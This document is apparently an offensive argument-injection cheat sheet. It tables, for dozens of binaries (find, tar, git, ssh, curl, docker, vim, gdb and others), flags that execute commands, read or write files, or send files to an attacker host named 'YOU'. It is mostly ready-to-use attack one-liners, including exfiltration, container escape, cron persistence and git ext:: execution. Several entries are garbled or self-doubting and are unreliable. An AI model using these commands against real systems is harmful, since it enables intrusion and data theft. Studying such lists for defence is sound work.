# Arg-Injection Deep — the per-binary flag/exec table

## The rule — argv-boundary sinks can't be shelled, but the arg is yours

`execFile('ping',[x])`/`subprocess.run(['ping',x])`/`ProcessBuilder('ping',x)`
— the arg IS the injection point; the binary's own flags do the work.

## The flag-injection taxonomy — what a flag can do

| Effect | Flags |
|---|---|
| exec a command | `-e`/`--exec`/`-T`/`--checkpoint-action`/`-oProxyCommand=` |
| read a file | `-f`/`--file`/`--include`/`--config`/`@file`/`--x-opts=file` |
| write a file | `-o`/`--output`/`-w`/`--write`/`--x-opts=` |
| load a module | `--load`/`-m`/`-r`/`--plugin`/`--require` |
| run a script | `--script`/`-s`/`-c`/`-f` |
| set a config | `-c`/`--config`/`--set`/`--define` |
| URL fetch | `-f`/`--url`/`-o`/`--remote-name`/`@url` |
| env-var | `--env`/`--setenv`/`env:`/`--with` |
| shell-out | `!`/`shell`/`.system`/`.run` |

## `find` — `-exec`/`-ok`/`-execdir`/`fprintf`

```
find . -exec sh -c 'id' \;
find . -exec id \;
find . -execdir sh -c 'id' \;
find . -execdir id \;
find . -ok id \;             — interactive-exec
find . -fprintf /tmp/o '%p'  — write
find . -fls /tmp/o           — write ls-format
find / -name x -exec sh -c 'cat /flag' \;
```

## `tar` — `--checkpoint-action`/`--to-command`/`--rsh-command`

```
tar --checkpoint-action=exec='id' -cf x x
tar --checkpoint=1 --checkpoint-action=exec=id -cf x x
tar --to-command='sh -c id' -xf x
tar --rsh-command='id' -cf x x
tar --use-compress-program='id' -xf x
tar -I 'id' -xf x            — -I is --use-compress-program
tar --info-script=id -xf x
tar -x --to-command='sh -c id' -f x
```

## `git` — `-c`/config/hooks/`--upload-pack`/`--exec`/`--pager`

```
git -c core.pager='id' log
git -c core.pager='id' diff
git -c core.sshCommand='id' fetch
git -c core.sshCommand='sh -c id' fetch
git -c protocol.ext.allow=always clone 'ext::id'
git clone 'ext::id'
git -c core.fsmonitor='id' status
git -c core.editor='id' commit --allow-empty -m x
git -c interactive.diffFilter='id' diff
git -c diff.external='id' diff
git -c gpg.program='id' log --show-signature
git fetch --upload-pack='id'
git fetch --upload-pack='sh -c id'
git remote add x 'ext::id';git fetch x
git --exec-path=/tmp/x status  — exec-path-dir
git -c alias.x='!id' x
git -c alias.x='!id';git x
git log --pretty=format:'%n$(id)'   — %-format
git show --format='%(id)'           — format-exec
git archive --format=tar --output=/tmp/x HEAD
```

## `curl`/`wget`/`aria2c`/`axel`/`fetch` — net+file-write

```
curl -o /tmp/o http://YOU/x          — write
curl -O http://YOU/x                 — write basename
curl -K /tmp/x http://x              — config-file
curl --config /tmp/x http://x        — config
curl -F 'f=@/flag' http://YOU/       — exfil-file
curl --data @/flag http://YOU/       — exfil-body
curl --post-file /flag http://YOU/   — exfil
curl file:///flag -o /tmp/o          — file:// read
curl dict://x/id                     — dict
curl gopher://x/_id                  — gopher
wget -O /tmp/o http://YOU/x          — write
wget --post-file=/flag http://YOU/   — exfil
wget -i /flag --post-data=x http://YOU/   — -i reads url-list
wget -F --post-file=/flag http://YOU/
aria2c -o /tmp/o http://YOU/x
aria2c --conf-path=/tmp/x http://x
axel -o /tmp/o http://YOU/x
fetch -o /tmp/o http://YOU/x         — freebsd
```

## `ssh`/`scp`/`sftp`/`ssh-keygen` — net+exec+write

```
ssh -oProxyCommand='id' x
ssh -oProxyCommand='sh -c id' x
ssh -oLocalCommand='id' x
ssh -oPermitLocalCommand=yes -oLocalCommand='id' x
ssh -oMatch='exec id' x
ssh -oProxyCommand='sh -c "exec id"' x
ssh -F /tmp/x x                      — config-file
scp -S /tmp/x x:y /tmp/o            — -S program
sftp -S /tmp/x x:/tmp/o /tmp/o
ssh -oSendEnv='x' -oSetEnv='x=y' x  — env-inject
ssh-keygen -f /flag -t rsa -N ''    — reads/uses file
ssh-agent sh -c 'id'                — agent-run
ssh-add -D -s /tmp/x                — add-pkcs11
```

## `nmap`/`tcpdump`/`tshark`/`dumpcap`/`wireshark` — packet-side

```
nmap --script=id                    — nse-script
nmap --script=x.nse
nmap -iL /flag                      — -iL reads target-list
nmap --stylesheet=/tmp/x
nmap --data=/flag                   — raw-payload
nmap --servicedb /flag              — read
nmap --versiondb /flag
nmap -oN /tmp/o x                   — write
nmap -oX /tmp/o x                   — write
nmap -oG /tmp/o x
nmap -oA /tmp/x x                   — write-base
tcpdump -r /flag                    — read pcap
tcpdump -w /tmp/o                   — write
tcpdump -z /tmp/x                   — postrotate-command
tcpdump -Z root -r /flag
tshark -r /flag                     — read
tshark -w /tmp/o                    — write
tshark -z 'follow,tcp,ascii,0' -r /flag  — follow
tshark -z 'expert' -r /flag
dumpcap -r /flag -w /tmp/o
wireshark -r /flag -X lua_script:/tmp/x
```

## `awk`/`gawk`/`mawk`/`nawk`/`sed`/`ed`/`ex` — script languages

```
awk 'BEGIN{system("id")}'
awk 'BEGIN{"id"|getline x;print x}'
awk -f /flag                        — -f reads script — file-read
gawk 'BEGIN{system("id")}'
mawk -W exec 'BEGIN{system("id")}'
nawk 'BEGIN{system("id")}'
sed -e 'id' x                       — ? sed -e runs? No — sed -e is a script
sed 's/x/e cmd/e'                   — GNU sed 'e' flag — exec!
sed '1e id' x                       — GNU sed e-cmd
ed x !id                            — ed's !-escape
ex -c '!id' x                       — ex
ex +'!id' x
vi +'!id' x
vim +'!id' x
vim -c ':!id' x
vim -c ':!id|q!' x
```

## `perl`/`python`/`ruby`/`php`/`node`/`lua`/`tclsh`/`irb` — langs

```
perl -e 'system("id")'
perl -e '`id`'
perl -e 'qx{id};print'
perl -MIO::Socket -e ...
python -c 'import os;os.system("id")'
python -c '__import__("os").system("id")'
python -c 'exec("import os;os.system(\"id\")")'
python -c 'eval("__import__(chr(111)+chr(115)).system(\"id\")")'
ruby -e 'system("id")'
ruby -e '`id`'
ruby -e '%x{id}'
ruby -e 'IO.popen("id").read'
php -r 'system("id");'
php -r 'echo `id`;'
php -r 'passthru("id");'
php -r 'echo shell_exec("id");'
node -e 'require("child_process").execSync("id").toString()'
node -e 'console.log(require("child_process").execSync("id"))'
node --eval 'require("child_process").execSync("id")'
lua -e 'os.execute("id")'
lua -e 'io.popen("id"):read("*a")'
tclsh <<< 'exec id'
irb -e 'system("id")'
irb -e '`id`'
php -d auto_prepend_file=/tmp/x -f /dev/null
php -d auto_append_file=/tmp/x -f /dev/null
```

## `mysql`/`psql`/`sqlite3`/`mongo`/`redis-cli`/`sqlplus` — DB-side

```
mysql -e '\! id'                     — \! escape
mysql -e 'system id'                 — mysql's system
mysql --init-command='id'            — init-command
mysql -e '\! id' -D db
psql -c '\! id'                      — \! escape
psql -c 'COPY x FROM PROGRAM id'     — COPY-FROM-PROGRAM
psql -c '\set x `id`'                — \set-backtick
psql -c '\o /tmp/o' -c 'id'          — \o write
sqlite3 x '.shell id'                — .shell
sqlite3 x '.system id'
sqlite3 x '.read /flag'              — .read
sqlite3 x '.output /tmp/o' '.dump'   — .output write
sqlite3 x '.once /tmp/o' 'select *'  — .once write
mongo --eval 'id'                    — mongo-eval
redis-cli -x set x < /flag          — pipe-write
redis-cli --eval /tmp/x             — lua-script
redis-cli --rdb /tmp/o              — rdb-write
sqlplus x/y@z @/tmp/x.sql           — script
sqlplus x/y@z 'select * from flag'  — query
```

## `systemctl`/`journalctl`/`service`/`init`/`systemd-*` — service-side

```
systemctl show x --property=x      — limited
journalctl --no-pager | head        — read
journalctl -u x | head
journalctl -f | head
journalctl -n 100 | head
service x start
initctl list
systemd-cat id                      — stdout→journal
systemd-tmpfiles --create /tmp/x    — tmpfiles-script
systemd-analyze verify /tmp/x       — unit-parse
loginctl list-sessions
busctl call ...                     — dbus
```

## `openssl`/`ssh-keygen`/`ssh-add`/`ssh-agent`/`gpg`/`keytool` — crypto-side

```
openssl x509 -in /flag               — read
openssl x509 -in /flag -text
openssl rsa -in /flag                — read
openssl dgst -sha256 /flag           — read-hash
openssl enc -in /flag -out /tmp/o    — read/write
openssl smime -encrypt -in /flag -out /tmp/o
openssl rand -hex 16 > /tmp/o        — write
openssl req -key /flag -new          — read
openssl pkcs12 -in /flag             — read
openssl cms -encrypt -in /flag -out /tmp/o
openssl s_client -connect YOU:443 < /flag  — send file
openssl s_client -connect YOU:443 -quiet < /flag
gpg --batch -e -r x /flag            — read-encrypt
gpg --batch -d /flag                 — read-decrypt
gpg --export x > /tmp/o              — write
ssh-keygen -f /flag -t rsa -N ''     — read (key-parse)
ssh-keygen -y -f /flag               — read-pubkey
ssh-add -s /tmp/x                    — pkcs11
ssh-agent sh -c 'id'                 — agent-run
keytool -list -keystore /flag        — read
keytool -importkeystore -srckeystore /flag -destkeystore /tmp/o
```

## `docker`/`podman`/`kubectl`/`nsenter`/`chroot`/`unshare`/`mount`/`ip`/`ip netns` — container/ns-side

```
docker run -v /:/host alpine cat /host/flag    — mount-escape
docker run -v /flag:/x alpine cat /x
docker exec x id                     — exec-in
docker cp x:/flag /tmp/o             — cp-out
docker exec x sh -c 'cat /flag'
docker save -o /tmp/o x              — write
docker import /tmp/x x               — import
docker build -f /tmp/x .             — build-context
podman run -v /:/host x cat /host/flag
kubectl exec x -- id
kubectl exec -n ns x -- cat /flag
kubectl cp x:/flag /tmp/o
kubectl exec -it x -- sh
nsenter -t 1 -m -u -i -n -p sh       — ns-enter
nsenter --all -t 1 sh
chroot /x sh                          — chroot-in
unshare -m sh                        — mount-ns
unshare -Ur sh                       — user-ns
mount --bind / /tmp/mnt              — bind-mount
mount -o bind / /tmp/mnt
mount -t proc proc /tmp/p            — proc-mount
ip netns exec x sh                   — netns
ip netns add x
```

## `base64`/`xxd`/`od`/`hexdump`/`uudecode`/`uuencode`/`zcat`/`zgrep`/`bzcat`/`lzcat`/`xzcat`/`zless`/`zmore`/`zsoelim`/`zdiff`/`zcmp`/`znew`/`zforce`/`ziptools`/`zip`/`unzip`/`7z`/`tar`/`cpio`/`ar`/`rpm`/`dpkg`/`deb`/`pack`/`compact`/`gzip`/`gunzip`/`bzip2`/`bunzip2`/`xz`/`unxz`/`lz4`/`zstd`/`compress`/`uncompress`/`sq`/`unsq`/`lha`/`arc`/`ark`/`zoo`/`rar`/`unrar`/`cabextract`/`upx`/`lzma`/`lzop`/`lzfse`/`brotli`/`lzss` — codec-side

```
zcat /flag                    — read
zgrep x /flag                 — read
zless /flag                   — read + pager
bzcat /flag                   — read
lzcat /flag                   — read
xzcat /flag                   — read
zip /tmp/x /flag              — read+write
zip -r /tmp/x /flag
zip -T --unzip-command='sh -c id' /tmp/x
unzip /flag -d /tmp/o         — read+write
unzip -p x.zip /flag > /tmp/o — extract to stdout→write
7z x /flag -o/tmp/o           — read+write
7z a /tmp/x /flag             — read+write
7z e /flag -o/tmp/o -so       — extract-to-stdout
tar cf /tmp/x /flag           — read+write
tar xf /flag -C /tmp/o        — read+write
cpio -i < /flag               — read
cpio -o > /tmp/o              — write
ar x /flag                    — read
rpm2cpio /flag | cpio -i      — read
dpkg-deb -x /flag /tmp/o      — read+write
gzip -c /flag > /tmp/o        — read+write
gunzip -c /flag > /tmp/o
bzip2 -c /flag > /tmp/o
xz -c /flag > /tmp/o
lz4 -c /flag > /tmp/o
zstd -c /flag > /tmp/o
compress -c /flag > /tmp/o
```

## `env`/`time`/`timeout`/`watch`/`taskset`/`ionice`/`nice`/`stdbuf`/`xargs`/`parallel`/`nohup`/`setsid`/`flock`/`chrt`/`schedtool`/`prlimit`/`runcon`/`setpriv`/`unshare`/`nsenter`/`chroot` — run-command-as-arg

```
env id                              — env as exec
env -i id                           — clean-env exec
env x=y id                          — env-set exec
time id                             — time exec
timeout 5 sh                        — run
timeout --signal=KILL 5 id
watch -n1 'id'                      — run
watch 'id'
taskset 1 id                        — affinity
taskset -c 0 id
ionice -c1 -n0 id                   — io-sched
nice -n0 id                         — nice
nohup id &                          — detach
stdbuf -o0 id                       — buffering
stdbuf -i0 -o0 -e0 id
xargs -a /flag cat                  — read-file-as-args
xargs -a /flag -n1 sh -c
xargs echo 'id' | sh
xargs -0 -a /flag
parallel id                         — parallel
parallel 'id' ::: x
flock /tmp/x id                     — flock-run
flock -s /tmp/x sh
chrt -f 99 id                       — sched
schedtool -F -p 99 -e id
prlimit --core=unlimited id
runcon -t x_t id                    — selinux
setpriv --reuid=0 --regid=0 id      — setpriv — priv-set
setpriv --init-groups id
nsenter -t 1 -a sh                  — nsenter
unshare -m sh                       — ns
chroot / sh                         — chroot
```

## `vi`/`vim`/`nvim`/`emacs`/`nano`/`pico`/`joe`/`jstar`/`jed`/`mcedit`/`mg`/`zile`/`kakoune`/`helix`/`ne`/`ee`/`ae`/`vile`/`nvi`/`vis`/`sam`/`ed`/`ex`/`sed`/`awk` — editor-side

```
vi -c ':!id' x                      — cmd-opt
vi +'!id' x
vi -c ':!id' -c ':q!' x
vim -c ':!id' x
vim +'!id' x
vim -c ':silent !id' x
vim -u NONE -c ':!id' x
vim --cmd 'id' x
vim -S /tmp/x                       — source-script
vim -u /tmp/x                       — vimrc-script
nvim -c ':!id' x
nvim +'!id' x
emacs -Q --eval '(shell-command "id")'  — elisp
emacs -Q --eval '(call-process "id")'
emacs -Q -l /tmp/x                  — load
emacs -Q -f 'shell-command' --eval 'id'
nano -R /flag                       — read (regexp-search in nano?)
nano /flag                          — read
pico /flag                          — read
joe /flag                           — read + ex-cmd
joe -c '!id' x
mcedit /flag                        — read
mg -f /tmp/x                        — mg-script
zile /flag                          — read
kakoune -e '!id' x
helix /flag                         — read
ne /flag                            — read
ee /flag                            — read
vile -c '!id' x
nvi -c ':!id' x
vis +'!id' x
ed x <<'EOF'
!id
EOF
ex -c ':!id' x
```

## `less`/`more`/`most`/`man`/`pinfo`/`info`/`journalctl`/`git log`/`hg log`/`svn log`/`view`/`vimpager`/`scat`/`pcat`/`uc`/`zless`/`zmore`/`zcat`/`bzless`/`bzmore`/`xzless`/`xzmore`/`lzless`/`lzmore`/`systemd`/`mutt`/`pine`/`alpine`/`mail`/`mutt` — pager-side

```
less /flag                          — read + !-escape
less +e /flag                       — read+exit
less -f /flag                       — read
man -P 'sh -c id' bash              — pager-cmd
man -P /tmp/x bash
PAGER='id' man bash
LESSOPEN='|id' less x               — preprocessor
LESSCLOSE='|id' less x
less !id                            — inside-less
most /flag                          — read
pinfo -r /flag                      — read
info --file=/flag                   — read
info --index-search=x /flag
journalctl -u x --no-pager | head   — read
journalctl --system --no-pager
git log --oneline | head            — read
view /flag                          — read + !-escape
vimpager /flag
zless /flag                         — read
zmore /flag
bzless /flag
xzless /flag
lzless /flag
mutt -f /flag                       — mailbox-read
pine -f /flag
alpine -f /flag
mail -f /flag                       — mbox-read
```

## `screen`/`tmux`/`byobu`/`abduco`/`dtach`/`mosh`/`minicom`/`picocom`/`cu`/`tip`/`scon` — terminal-side

```
screen -S x -X stuff 'id\n'         — stuff-cmd
screen -S x -X exec id              — exec-cmd
screen -q -S x -X colon 'exec id^M'
screen -dmS x sh -c 'id'
screen -S x -p 0 -X stuff 'id\n'
screen -x x                         — attach
tmux new-session -d 'id'            — detached-run
tmux new-session -d 'sh -c "id"'
tmux send-keys -t x 'id' Enter      — send-keys
tmux run-shell 'id'                 — run-shell
tmux display-message -p '#{pane_current_command}'  — info
tmux new-window 'id'
tmux split-window 'id'
tmux select-pane -t 0
byobu -c 'id' x                     — byobu-cmd
abduco -c x sh                      — abduco-session
dtach -c /tmp/x sh                  — dtach-session
dtach -a /tmp/x -e 'id'
mosh --server='id' x                — mosh-server
minicom -D /flag -S /tmp/x          — script
picocom /flag --imap /tmp/x         — imap-script
cu -l /flag -s 9600                 — cu-line
tip /flag                           — tip-line
```

## `xterm`/`urxvt`/`alacritty`/`kitty`/`gnome-terminal`/`konsole`/`xfce4-terminal`/`mate-terminal`/`terminator`/`tilix`/`st`/`rxvt`/`mlterm`/`wezterm`/`foot`/`contour`/`iTerm`/`Terminal`/`cmd`/`powershell`/`pwsh`/`wt` — terminal-emulator-side

```
xterm -e id                         — -e exec
xterm -e sh -c id
urxvt -e id
alacritty -e id
alacritty msg create-window -e id
kitty +runpy 'id'
kitty @ launch --type=window id
gnome-terminal -- id
gnome-terminal -- sh -c id
konsole -e id
xfce4-terminal -e id
mate-terminal -e id
terminator -e id
tilix -e id
st -e id
rxvt -e id
mlterm -e id
wezterm cli spawn id
foot -e id
contour exec id
iTerm2 --command id                 — mac
Terminal -e id                      — mac-ish
cmd /c id                           — windows
powershell -c id
pwsh -c id
wt -p x cmd /c id                   — windows-terminal
```

## `mail`/`sendmail`/`msmtp`/`ssmtp`/`smtp-cli`/`swaks`/`mutt`/`alpine`/`pine`/`mailx`/`bsd-mailx`/`heirloom-mailx`/`s-nail`/`s-nail` — mail-side

```
mail -s 'x' x < /flag               — read+send
mail -a /flag x                     — attach-file
mailx -a /flag x
sendmail -t < /tmp/x                — send-file
sendmail -bv x                      — verify
sendmail -C /tmp/x                  — config-file
sendmail -d1 -bv x                  — debug
msmtp -C /tmp/x x                   — config
msmtp --file=/tmp/x x
msmtp --read-recipients < /tmp/x
msmtp --read-envelope-from -t < /flag
ssmtp -t < /tmp/x
ssmtp -v x@x < /tmp/x
smtp-cli --verbose --host=YOU --body-file=/flag
swaks --server YOU --body @/flag
swaks --server YOU --attach /flag
mutt -a /flag -s x x </dev/null    — attach
mutt -a /flag -s x -- x </dev/null
alpine -f /flag
alpine -I ^p,x
mail -f /flag                       — read-mbox
mailx -f /flag
s-nail -f /flag
```

## `gcc`/`g++`/`cc`/`cpp`/`as`/`ld`/`objcopy`/`objdump`/`readelf`/`nm`/`ar`/`ranlib`/`strip`/`addr2line`/`c++filt`/`elfedit`/`gprof`/`gcov`/`gcov-tool`/`strings`/`size`/`dwp`/`ldd`/`gdb`/`strace`/`ltrace`/`rr`/`valgrind`/`perf`/`bpftrace`/`dtrace`/`ltrace`/`mtrace`/`trace-cmd`/`funccount`/`bcc`/`bpftrace`/`systemtap`/`stap` — compiler/trace-side

```
gcc /tmp/x.c -o /tmp/o              — compile — x.c carries #include + exec-code
gcc -x c -o /tmp/o - <<'EOF'
#include <stdlib.h>
int main(){system("id");}
EOF
gcc -wrapper /tmp/x                 — wrapper
gcc -Wl,-e,entry                    — link-opt
gcc -T /tmp/x                       — linker-script
g++ /tmp/x.cc -o /tmp/o
cc /tmp/x.c -o /tmp/o
cpp /tmp/x                          — preprocessor — reads file
as /tmp/x.s -o /tmp/o               — assemble
ld /tmp/x.o -o /tmp/o               — link
ld -T /tmp/x                        — script
objcopy /tmp/x /tmp/o               — copy-transform
objdump -d /tmp/x                   — disasm
objdump -s -j .data /tmp/x
readelf -a /tmp/x                   — readelf
readelf -x .data /tmp/x
nm /tmp/x                           — symbols
ar x /flag                          — extract-ar
ar r /tmp/x /flag                   — create-ar
ranlib /tmp/x                       — ar-index
strip /tmp/x                        — strip
addr2line -e /tmp/x 0               — addr2line
c++filt < /flag                     — demangle-read
elfedit /tmp/x                      — edit-elf
gprof /tmp/x                        — profile-read
gcov /tmp/x                         — coverage
strings /flag                       — strings-read
strings -a /flag
size /tmp/x                         — size-read
dwp -o /tmp/o /tmp/x                — dwp-read
ldd /tmp/x                          — ldd — risky — executes
gdb -batch -ex '!id'                — !-escape
gdb -batch -ex 'shell id'
gdb -batch -ex 'python import os;os.system("id")'
gdb -q -ex '!id'
strace -o /tmp/o id                 — strace-write
strace -o /tmp/o -f sh
ltrace -o /tmp/o id                 — ltrace-write
rr record id                        — record
valgrind --log-file=/tmp/o id       — valgrind-log
perf record -o /tmp/o id            — perf-record
perf script -i /flag > /tmp/o       — perf-script
bpftrace -e 'BEGIN{system("id")}'   — bpftrace
dtrace -n 'BEGIN{system("id")}'     — dtrace
trace-cmd record -e 'x' id          — trace-cmd
stap -e 'probe begin{system("id")}' — systemtap
```

## `rsync`/`rdiff`/`rclone`/`lftp`/`ncftp`/`ncftpput`/`ncftpget`/`sftp`/`scp`/`rsync`/`bbcp`/`fcp`/`gsutil`/`aws`/`az`/`gcloud`/`s3cmd`/`rclone`/`minio`/`mc`/`ossutil`/`hdfs`/`hadoop`/`ftp`/`lftp`/`ncftp`/`sftp`/`scp`/`smbclient`/`smbget`/`mount`/`mount.cifs`/`mount.nfs`/`sshfs`/`curlftpfs`/`davfs2`/`glusterfs`/`ceph`/`rbd`/`rados`/`radosgw-admin` — transfer-side

```
rsync -e 'id' x:y /tmp/o            — -e shell
rsync --rsh='id' x:y /tmp/o
rsync --rsync-path='id' x:y /tmp/o
rsync --rsync-path='sh -c "id"' x:y /tmp/o
rsync -e 'sh -c "id"' x:y /tmp/o
rsync --chmod='u+x' /flag /tmp/o    — read+write
rsync /flag /tmp/o                  — read+write
rsync --files-from=/flag /tmp/o     — filelist-read
rsync --exclude-from=/flag
rclone copy /flag /tmp/o            — read+write
rclone cat remote:x
lftp -c 'get /flag -o /tmp/o'       — ftp-get
lftp -c 'put /tmp/o -o /flag'       — ftp-put
lftp -e 'open x;get /flag'
ncftp -u x -p y ftp://x/flag -o /tmp/o
sftp -b /tmp/x x:/flag              — batch-file
sftp x:/flag /tmp/o                 — get
scp x:/flag /tmp/o                  — copy
scp -S /tmp/x x:y /tmp/o            — -S program
gsutil cp gs://x/flag /tmp/o        — gcs
aws s3 cp s3://x/flag /tmp/o        — aws
az storage blob download --file /tmp/o --name flag
gcloud storage cp gs://x/flag /tmp/o
s3cmd get s3://x/flag /tmp/o
mc cp x/flag /tmp/o                 — minio
ossutil cp oss://x/flag /tmp/o
hdfs dfs -get /flag /tmp/o          — hdfs
hadoop fs -get /flag /tmp/o
ftp -n x <<'EOF'
get /flag /tmp/o
EOF
ftp x <<'EOF'
!id
EOF
smbclient //x/y -c 'get /flag /tmp/o'
smbclient -U x%y //x/y -c 'get /flag'
mount -t cifs //x/y /mnt -o 'x'     — mount
mount.cifs //x/y /mnt -o 'x'
mount.nfs x:/ /mnt
sshfs x:/ /mnt -o 'ssh_command=id'  — ssh-command
curlftpfs ftp://x/y /mnt -o 'x'
davfs2 mount http://x /mnt
glusterfs --volfile=/tmp/x /mnt
rbd map x                           — ceph-map
```

## `journalctl`/`logger`/`syslog`/`logrotate`/`rsyslogd`/`syslog-ng`/`klogd`/`metal-log` — log-side

```
logger -f /flag                     — read+send-syslog
logger -n YOU -P 514 'x'            — send-UDP
logger -T -P 514 -n YOU -f /flag    — read+send
logger -p auth.info 'x'
journalctl -u x --no-pager | head   — read
journalctl --system --no-pager
journalctl -f
journalctl --disk-usage
journalctl -x /flag                 — -x? no
logrotate -f /tmp/x                 — config-script
logrotate -d /tmp/x
logrotate -s /tmp/x /flag           — state-file
rsyslogd -f /tmp/x                  — config
syslog-ng -f /tmp/x                 — config
klogd -f /flag                      — read
```

## `crontab`/`at`/`batch`/`atq`/`atrm`/`systemd-run`/`run-parts`/`cron`/`anacron`/`inotifywait`/`inotifywatch` — schedule-side

```
crontab /tmp/x                      — crontab-install
crontab -l                          — list
crontab -e                          — edit
echo '* * * * * id' | crontab -     — install-via-stdin
echo '* * * * * sh -c id' > /tmp/x;crontab /tmp/x
at now + 1 min <<'EOF'
id
EOF
echo 'id' | at now + 1 min
echo 'id' | at -m now
echo 'id' | batch
atq                               — at-queue
atrm x                            — at-remove
systemd-run --scope id              — scope-run
systemd-run --user --scope id
systemd-run --unit=x --service-type=oneshot id
run-parts /tmp                      — run-dir
inotifywait /tmp -e access          — watch
inotifywait -m /tmp -e open -r
inotifywatch /tmp -t 10
```

## `iptables`/`ip6tables`/`nft`/`ebtables`/`arptables`/`ipset`/`tc`/`ip`/`ifconfig`/`route`/`netstat`/`ss`/`arp`/`ndp`/`ndisc6`/`ndpmon`/`ethtool`/`mii-tool`/`vconfig`/`brctl`/`bridge`/`ovs-vsctl`/`ovs-ofctl`/`ipmitool`/`lldpctl`/`lldpcli` — net-side

```
iptables -L                         — list-rules
iptables -L -n -v
iptables -t nat -L
iptables-save > /tmp/o              — save-write
iptables-restore < /tmp/x           — restore-script
nft list ruleset                    — nft-list
nft -f /tmp/x                       — nft-script
ip addr show
ip route show
ip link show
ip netns list
ip -s link
ifconfig -a
route -n
netstat -tulpn
netstat -an
ss -tulpn
ss -an
arp -a
ethtool -i eth0
brctl show
bridge link
ovs-vsctl show
ovs-ofctl dump-flows x
ipmitool -I lan -H x -U y -P z sol info
lldpctl
```

## The bottom line

ANY binary on a GTFOBins-style list is an escape. When the shell reaches
a binary and its args are yours, the binary's own man page is the
attack surface — flags are the injection, not separators.
